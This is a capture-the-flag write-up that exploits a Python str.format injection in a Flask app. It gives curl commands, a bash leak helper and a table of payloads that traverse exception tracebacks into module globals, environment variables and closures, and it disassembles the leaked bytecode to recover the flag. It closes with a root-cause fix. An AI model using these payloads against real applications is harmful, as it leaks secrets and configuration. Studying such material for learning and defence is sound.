---
title: "greetings-i18n-2: from str.format injection to bytecode"
date: 2026-08-23 20:00:00 +0600
series: "AlpacaHack Daily"
platform: "AlpacaHack"
summary: "A format-string injection walks an exception's traceback into module globals, leaks the checker's code object, and the check is inverted offline."
description: "A format-string injection walks an exception's traceback into module globals, leaks the checker's code object, and the check is inverted offline."
tags: ["web", "python"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
**TL;DR:** A Python `str.format` injection lets you control the format string applied to an *exception object*. `err.__traceback__.tb_frame.f_globals` pivots into the application's module globals, reaching the imported `check` function. The flag isn't a global, so instead we exfiltrate `check.__code__` (`co_consts` / `co_code` / `co_names` / `co_varnames`), disassemble it offline, and algebraically invert the checker.

---

## 1. Recon

Files provided:

```
compose.yaml
web/Dockerfile      # python:3.14.6-slim-trixie (pinned), Flask==3.1.3
web/app.py
web/check.py        # def check(input): return True  # "different in the remote server"
```

`check.py` is explicitly stubbed out, so the flag lives inside the remote copy of `check()`. The goal is to read it out of a running process.

The relevant part of `app.py`:

```python
def _(key: str):
    custom = request.form.get(f"custom-{key}")   # (1) attacker-controlled template
    if custom:
        return custom
    lang = parse_accept_language()
    return translations.get(key).get(lang, key)

@app.get("/")
def index():
    try:
        username = request.args.get("username", "anonymous user")
        return _("hello").format(username=username), 200, {...}      # (2)
    except Exception as e:
        return _("error").format(err=e), 500, {...}                  # (3)
```

Three observations chain together:

1. **`_()` returns an attacker-supplied string** whenever `custom-<key>` is present in the form body.
2. **That string is passed to `.format()`.** `str.format` is not just interpolation - the field syntax permits arbitrary **attribute access** (`{x.a.b}`) and **subscripting** (`{x[key]}`, where an unquoted key is taken as a *string* literal). It cannot *call* anything, but traversal is enough here.
3. **The `except` branch formats an exception object.** Exceptions carry `__traceback__`, which is the standard escape hatch out of a "you only have a `str`" format-string injection into arbitrary module globals.

### Does `request.form` populate on a GET request?

The only route is `@app.get("/")`, so the `custom-*` fields must ride in the body of a **GET** request. Werkzeug parses form data based on `Content-Type`, not the HTTP method, so this works. Confirm it before building the full payload:

```bash
curl -s -X GET "$TARGET/?username=x" --data-urlencode 'custom-hello=PWNED'
# -> PWNED
```

The response header also leaks the exact runtime, which matters later:

```
Server: Werkzeug/3.1.8 Python/3.14.6
```

> **Windows note.** Run every `curl` below from **Git Bash**. `cmd.exe` does not treat `'` as a quote character, so `'custom-hello=...'` is sent with the quotes embedded, the field is named `'custom-hello`, `request.form.get("custom-hello")` returns `None`, and you silently get the ordinary `Hello, x!` response. In PowerShell, `curl` is additionally an alias for `Invoke-WebRequest` - use `curl.exe` and double quotes there.

---

## 2. The primitive

Send **both** overrides in a single request: `custom-hello` deliberately raises so control reaches the `except` branch, where `custom-error` performs the read.

```bash
export TARGET=http://<host>:9901

leak() {   # usage: leak '<expr after check.>'
  curl -s -X GET "$TARGET/?username=x" \
    --data-urlencode 'custom-hello={username.nope}' \
    --data-urlencode "custom-error={err.__traceback__.tb_frame.f_globals[check].$1}"
  echo
}
```

- `{username.nope}` → `AttributeError: 'str' object has no attribute 'nope'`.
- `err.__traceback__.tb_frame` → the frame of `index()`, i.e. where the exception was raised.
- `.f_globals` → `app.py`'s module globals.
- `[check]` → the `check` **function** object (`app.py` does `from check import check`, so this is the function, not the module - had it been `import check` you would need `.check`, or go straight to module attributes).

## 3. Locating the flag

First look for an obvious module-level constant:

```bash
leak '__globals__' > out.txt
```

The response is ~7.5 KB because `__globals__` drags in the entire `__builtins__` dict, so extract just the key names:

```bash
grep -oE "'[A-Za-z_][A-Za-z0-9_]*': " out.txt | sort -u
```

Result: builtins plus exactly one interesting name - `check`. **No flag global, no `os` import.** So the flag is baked into the function body. Check the code object:

```bash
leak '__code__.co_consts'
```

```python
(50, False, slice(None, None, 3), 'Aa{5MgRJnYIHKk4GA', None,
 '}Eq4CBLZgRlZqs7cl', 256, b'\xbcrQ5\xc1\xfc\x07#\xfa\xac\xfc\xcd\x98_>\x02',
 True, -3)
```

That's the whole checker's data. Also worth pulling:

```bash
leak '__code__.co_names'      # ('len', 'bytes', 'range', 'ord')
leak '__code__.co_varnames'   # ('input', 'i')
leak '__defaults__'           # None
leak '__closure__'            # None
```

Two useful inferences before touching the bytecode:

- `co_consts` contains **no nested code object**. Generator expressions compile to their own code object; *list* comprehensions have been inlined since PEP 709 (3.12). Combined with `i` living in `co_varnames`, the transform is a list comprehension: `bytes([... for i in range(...)])`.
- `slice(None, None, 3)` and `-3` mean the two strings are `input[::3]` and `input[::-3]`.

### Free win: partial plaintext

With `len == 50`, `input[::3]` gives indices `0,3,…,48` and `input[::-3]` gives `49,46,…,1` - reverse it and it is `input[1::3]`. Two thirds of the flag, for free:

```
A l ? a c ? { 7 ? 5 s ? M q ? ...
```

`Al?ac?{` is `Alpaca{`, which confirms the reconstruction and the flag format before any real work. Only `flag[2::3]` (16 characters) is unknown - and the blob in `co_consts` is exactly 16 bytes long.

## 4. Recovering the algorithm

Leak the bytecode and metadata:

```bash
for p in co_code co_argcount co_stacksize co_flags co_nlocals; do
  printf '%s = ' "$p"; leak "__code__.$p"
done
```

Bytecode is version-specific, so disassemble under a **matching interpreter** (the `Server:` header said 3.14.6):

```bash
conda create -n py314 python=3.14 -y
conda run -n py314 python -VV     # Python 3.14.6
```

`dis.dis()` on a hand-rebuilt `CodeType` blows up with an `IndexError` inside its argument resolver (the rebuilt object has no valid line or exception table). Walking the opcode stream manually is more robust - see `solve/disasm.py`. Two 3.14-specific details matter: caches must be skipped using `dis._cache_format`, and `BINARY_OP` now subsumes subscripting (`NB_SUBSCR = 26`), alongside `NB_ADD = 0`, `NB_MULTIPLY = 5`, `NB_REMAINDER = 6`, `NB_XOR = 12`.

The disassembly maps cleanly back to source:

```python
def check(input):
    if len(input) != 50:
        return False
    if input[::3]  != 'Aa{5MgRJnYIHKk4GA':
        return False
    if input[::-3] != '}Eq4CBLZgRlZqs7cl':
        return False
    if bytes([(7 * ord(input[i*3])     % 256)
            ^ (5 * ord(input[i*3 + 1]) % 256)
            ^ ((3 * ord(input[i*3 + 2]) + 23) % 256)
              for i in range(16)]) != b'\xbcrQ5\xc1\xfc\x07#\xfa\xac\xfc\xcd\x98_>\x02':
        return False
    return True
```

## 5. Inverting it

The comprehension is **position-independent**: output byte `i` depends only on `input[3i]`, `input[3i+1]`, `input[3i+2]`. The first two are already known from the slices, so per index:

```
(3·x + 23) mod 256  =  target[i] XOR (7·ord(f[3i]) mod 256) XOR (5·ord(f[3i+1]) mod 256)
```

`gcd(3, 256) = 1`, so 3 is invertible mod 256 (`3⁻¹ = 171`), giving a direct solve with no brute force:

```
x = 171 · (t − 23) mod 256
```

`i` ranges over `0..15`, so `3i+2` covers indices `2..47`; indices 48 and 49 come from the slices. Full coverage.

```bash
conda run -n py314 python solve/solve.py
# Alpaca{7X5svMqHgZHRlZJR8ngLYZNILxHBxKCAk454qpGE1A}
# local check: True
```

## 6. Confirm against the server

```bash
curl -s -X POST "$TARGET/check" \
  --data-urlencode "input=Alpaca{7X5svMqHgZHRlZJR8ngLYZNILxHBxKCAk454qpGE1A}"
# That's the correct flag!
```

---

## Fallbacks worth knowing

If the flag had not been in `co_consts`:

| Situation | Payload |
|---|---|
| Module-level constant | `{err.__traceback__.tb_frame.f_globals[check].__globals__[FLAG]}` |
| Read from environment | `{err.__traceback__.tb_frame.f_globals[check].__globals__[os].environ}` |
| Closure variable | `{err.__traceback__.tb_frame.f_globals[check].__closure__[0].cell_contents}` |
| Caller frames / library globals | `{err.__traceback__.tb_frame.f_back.f_globals}` |
| Flask internals | `{err.__traceback__.tb_frame.f_globals[app].__dict__}` |

Remember `str.format` **cannot call** anything - no `__subclasses__()`, no RCE. Attribute traversal, subscripting, and the `repr` of whatever you land on is the entire primitive (`{x!r}` and format specs give some control over rendering).

## Root cause & fix

Never let user input become a **format string**. `_()` returns attacker data straight into `.format()`. Interpolate user data as an *argument* instead:

```python
return "Hello, {username}!".format(username=username)   # data is an argument, not the template
```

Additional hardening: only accept template overrides from a trusted catalogue (never from request data); don't format exception objects into responses - log them and return an opaque error id. (Separately, `translations.get(key).get(...)` would `AttributeError` on an unknown key.)
{% endraw %}
